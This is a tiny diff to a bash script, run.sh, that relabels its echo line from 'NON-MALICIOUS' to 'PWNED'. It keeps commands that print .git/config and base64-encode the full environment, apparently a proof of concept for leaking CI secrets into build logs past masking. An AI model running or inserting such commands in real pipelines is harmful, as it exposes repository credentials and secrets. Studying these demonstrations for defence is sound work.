@@ -1,4 +1,4 @@
 #!/usr/bin/env bash
-echo NON-MALICIOUS RUN.SH
+echo PWNED PWNED PWNED RUN.SH
 cat .git/config
 env|base64
